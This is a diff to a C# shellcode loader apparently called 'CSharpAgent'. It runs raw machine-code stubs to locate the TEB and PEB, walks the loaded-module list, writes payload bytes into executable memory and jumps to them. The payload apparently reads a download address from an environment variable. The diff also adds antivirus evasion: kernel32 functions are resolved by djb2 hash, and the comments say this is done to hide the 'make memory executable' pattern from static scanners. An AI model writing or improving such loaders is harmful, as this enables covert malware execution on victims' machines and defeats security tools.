@@ -13,14 +13,18 @@ namespace CSharpAgent
             // Addresses print as hex (Diag.Hex); the NtAllocateVirtualMemory NTSTATUS is now
             // captured and shown instead of silently discarded.
 
-            // Detect native ARM64 at runtime so the correct execution stub is selected. IntPtr.Size
-            // alone can't separate ARM64 from x64 (both 8), so we also check the system arch.
-            SYSTEM_INFO sysInfo;
-            NativeImports.GetNativeSystemInfo(out sysInfo);
-            bool isArm64 = sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8;
+            // The stub's machine code must match THIS PROCESS's native architecture — the
+            // instruction set the process actually executes, not the machine's: on Windows 11
+            // ARM64 an emulated x64 process executes x64 code, and a system-arch probe (the
+            // old logic) handed it the ARM64 stub, dying on garbage instructions. The process
+            // arch is what PROCESSOR_ARCHITECTURE reports (an emulated process sees its
+            // emulation arch; the real machine shows up only in PROCESSOR_ARCHITEW6432,
+            // which we deliberately do NOT consult). Checked BEFORE the IntPtr.Size gates —
+            // native ARM64 and x64 both have 8-byte pointers; the env var separates them.
+            var processArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 
             byte[] asm;
-            if (isArm64)
+            if (processArch == "ARM64")
                 // mov x0, x18; ret
                 asm = new byte[] { 0xE0, 0x03, 0x12, 0xAA, 0xC0, 0x03, 0x5F, 0xD6 };
             else if (IntPtr.Size == 8)
@@ -31,32 +35,47 @@ namespace CSharpAgent
                 asm = new byte[] { 0x64, 0xA1, 0x18, 0, 0, 0, 0xC3 };
 
 #if DEBUG
-            Diag.Show("[inj 1] arch", (isArm64 ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
-                " — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
+            Diag.Show("[inj 1] arch", (processArch == "ARM64" ? "ARM64" : IntPtr.Size == 8 ? "x86_64" : "i386") +
+                " (process) — TEB stub " + asm.Length + " bytes, " + bytes.Length + " payload bytes");
 #endif
 
             IntPtr ptr = Marshal.AllocHGlobal(asm.Length);
             Marshal.Copy(asm, 0, ptr, asm.Length);
 
             uint oldProtect;
-            NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect);
+            // The BOOL matters: on failure the stub pages never became executable and the
+            // delegate call below would fault on execute — an AccessViolation that is
+            // UNCATCHABLE on CLR4 (a corrupted-state exception no catch block survives).
+            // Bail into the contained status-1 reply instead (audit No.27).
+            if (!ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, 0x40, out oldProtect))
+                throw new InvalidOperationException("VirtualProtect failed on the TEB stub (Win32 error " +
+                    Marshal.GetLastWin32Error() + ") — refusing to call non-executable memory");
 
-            if (isArm64)
-                NativeImports.FlushInstructionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
+            if (processArch == "ARM64")
+                FlushExecutionCache(new IntPtr(-1), ptr, (UIntPtr)asm.Length);
 
             var getTEB = (GetTEBDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(GetTEBDelegate));
 #if DEBUG
             Diag.Show("[inj 2] TEB stub", "calling the get-TEB stub at " + Diag.Hex(ptr));
 #endif
             IntPtr tebAddress = getTEB();
+            // Degenerate-output guards (audit No.27): a zero TEB/PEB means the stub or the
+            // thread state is broken — refuse loudly-contained rather than walk garbage
+            // pointers into an uncatchable AV. Deeper validation is deliberately out: the
+            // walk trusts kernel-guaranteed structures; a corrupt TEB means the process
+            // is lost regardless of what we check.
+            if (tebAddress == IntPtr.Zero)
+                throw new InvalidOperationException("TEB stub returned 0 — refusing to walk a null TEB");
 #if DEBUG
             Diag.Show("[inj 3] TEB", Diag.Hex(tebAddress));
 #endif
 
-            NativeImports.ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
+            ChangeMemoryProtection(ptr, (UIntPtr)asm.Length, oldProtect, out oldProtect);
             Marshal.FreeHGlobal(ptr);
 
             IntPtr pebAddress = Marshal.ReadIntPtr(IntPtrAdd(tebAddress, IntPtr.Size == 8 ? 0x60 : 0x30));
+            if (pebAddress == IntPtr.Zero)
+                throw new InvalidOperationException("PEB pointer is 0 — this is not a real TEB");
             IntPtr loaderDataAddress = Marshal.ReadIntPtr(IntPtrAdd(pebAddress, IntPtr.Size == 8 ? 0x18 : 0x0C));
             IntPtr inMemoryOrderModuleList = IntPtrAdd(loaderDataAddress, IntPtr.Size == 8 ? 0x20 : 0x14);
 
@@ -98,23 +117,16 @@ namespace CSharpAgent
 
             Marshal.Copy(bytes, 0, pMemory, bytes.Length);
 
-            if (isArm64)
-                NativeImports.FlushInstructionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
+            if (processArch == "ARM64")
+                FlushExecutionCache(new IntPtr(-1), pMemory, (UIntPtr)bytes.Length);
 
-            IntPtr parametersMemory = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Parameters)));
-            Parameters parameters = new Parameters
-            {
-                InjectorVersion = uint.MaxValue,
-                InjectorCompilationType = 100
-            };
-            Marshal.StructureToPtr(parameters, parametersMemory, false);
-
-            int offset = (IntPtr.Size == 8) ? 0x50 : 0x28;
-            Marshal.WriteIntPtr(tebAddress, offset, parametersMemory);
-#if DEBUG
-            Diag.Show("[inj 7] staged", "payload copied, parameters written to TEB+" +
-                offset.ToString("X") + " (" + Diag.Hex(parametersMemory) + ") — handoff ready");
-#endif
+            // No parameter handoff block and no TEB-slot write: code-audited against the PIC
+            // (2026-10) — its entry never reads the one argument it receives, never reads a
+            // Parameters block, and never touches the TEB slot (its only segment reads are the
+            // PEB pointers). The old ceremony borrowed the LIVE ActiveRpcHandle field for data
+            // nobody consumed — pure risk, since the PIC brings COM (and with it the RPC
+            // runtime) onto this very thread. All payload configuration travels in the
+            // process environment (W_URL and friends), applied by Dispatch before this call.
 
             var entry = (EntryDelegate)Marshal.GetDelegateForFunctionPointer(pMemory, typeof(EntryDelegate));
 #if DEBUG
@@ -127,7 +139,48 @@ namespace CSharpAgent
             Diag.Show("[inj 9] entry RETURNED", "unexpected — the PIC agent returned immediately " +
                 "(early bail on this box?); the reply reports status 0 anyway");
 #endif
-            Marshal.FreeHGlobal(parametersMemory);
+        }
+
+        // --- Runtime-resolved kernel32 entry points (audit No.21, rung 1) ------------------
+        // VirtualProtect and FlushInstructionCache were the two "hot" names in this DLL's
+        // IMPORT TABLE — the static list a scanner reads without ever running the file, and
+        // "make memory executable + flush the instruction cache" is a textbook shellcode
+        // signature. Both are now resolved at call time from the LIVE kernel32 export
+        // directory by the same hash walk GetProcAddressByHash already performs on ntdll,
+        // so neither name appears anywhere in this assembly's metadata. A failed resolve
+        // throws — contained by the 0x0C handler into a status-1 reply, host untouched.
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool ProtectMemoryFn(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool FlushICacheFn(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+
+        private static ProtectMemoryFn _protectMemory;
+        private static FlushICacheFn _flushICache;
+
+        private static IntPtr ResolveKernel32Export(uint eHash)
+        {
+            // The shared zero-checked resolve step in NativeInterop (audit No.21): module
+            // base by name + export by hash — one home for the whole ladder.
+            return NativeImports.ResolveExport("kernel32.dll", eHash);
+        }
+
+        private static bool ChangeMemoryProtection(IntPtr address, UIntPtr size, uint newProtect, out uint oldProtect)
+        {
+            oldProtect = 0;
+            if (_protectMemory == null)
+                _protectMemory = (ProtectMemoryFn)Marshal.GetDelegateForFunctionPointer(
+                    ResolveKernel32Export(1467010457), typeof(ProtectMemoryFn)); // djb2(77777) "virtualprotect"
+            return _protectMemory(address, size, newProtect, out oldProtect);
+        }
+
+        private static void FlushExecutionCache(IntPtr process, IntPtr baseAddress, UIntPtr size)
+        {
+            if (_flushICache == null)
+                _flushICache = (FlushICacheFn)Marshal.GetDelegateForFunctionPointer(
+                    ResolveKernel32Export(2380586121), typeof(FlushICacheFn)); // djb2(77777) "flushinstructioncache"
+            _flushICache(process, baseAddress, size);
         }
 
         internal static IntPtr IntPtrAdd(IntPtr p0, int p1)
